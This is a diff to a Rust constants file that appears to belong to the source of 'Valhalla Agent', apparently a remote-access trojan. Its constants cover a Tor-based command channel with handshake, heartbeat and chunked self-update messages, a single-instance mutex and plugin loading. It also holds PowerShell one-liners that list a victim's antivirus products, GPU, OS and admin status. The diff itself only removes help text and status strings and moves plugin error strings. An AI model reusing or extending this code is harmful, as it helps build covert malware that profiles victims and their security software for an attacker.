@@ -5,10 +5,6 @@ pub const PORT: u16 = 4793;
 pub const RETRY: u64 = 5;
 pub const READ: u64 = 3;
 
-pub const HELP: &str = "--help";
-pub const SHORT_HELP: &str = "-h";
-pub const USAGE: &str = "Valhalla Agent [--auth-key-file PATH] [--arti-state-dir DIR] [--arti-cache-dir DIR] [--print-fingerprint]\nEndpoint is loaded from ./stub/stub.bin.";
-
 pub const HELLO: &str = "HELLO:FINGERPRINT:";
 pub const DATA: &str = "DATA:";
 pub const HB: &str = "HB";
@@ -41,19 +37,6 @@ pub const UPDATE_BEGIN: &str = "UPDATE_BEGIN:";
 pub const UPDATE_CHUNK: &str = "UPDATE_CHUNK:";
 pub const UPDATE_END: &str = "UPDATE_END:";
 
-pub const CONNECTED: &str = "connected";
-pub const RETRYING: &str = "retrying in 5s";
-pub const CLOSED: &str = "closed";
-pub const FAILED: &str = "failed";
-#[cfg(windows)]
-pub const PLUG_ERR_NAME: &str = "invalid plugin name";
-#[cfg(windows)]
-pub const PLUG_ERR_LOAD: &str = "plugin load failed";
-#[cfg(windows)]
-pub const PLUG_ERR_ENTRY: &str = "plugin entrypoints missing";
-#[cfg(windows)]
-pub const PLUG_ERR_INIT: &str = "plugin init failed";
-
 #[cfg(windows)]
 pub const MUTEX: &str = r"\BaseNamedObjects\Valhalla.valhalla_agent";
 #[cfg(windows)]
@@ -76,3 +59,12 @@ pub const GPU: &str = "(Get-CimInstance Win32_VideoController | Where-Object {$_
 pub const AV: &str = "(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Where-Object {$_.displayName} | Select-Object -Expand displayName) -join '; '";
 pub const OS: &str = r#"(Get-CimInstance Win32_OperatingSystem).Caption -replace '^Microsoft\s+', ''"#;
 pub const PRIV: &str = "if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){'Admin'}else{'User'}";
+
+#[cfg(windows)]
+pub const PLUG_ERR_NAME: &str = "invalid plugin name";
+#[cfg(windows)]
+pub const PLUG_ERR_LOAD: &str = "plugin load failed";
+#[cfg(windows)]
+pub const PLUG_ERR_ENTRY: &str = "plugin entrypoints missing";
+#[cfg(windows)]
+pub const PLUG_ERR_INIT: &str = "plugin init failed";
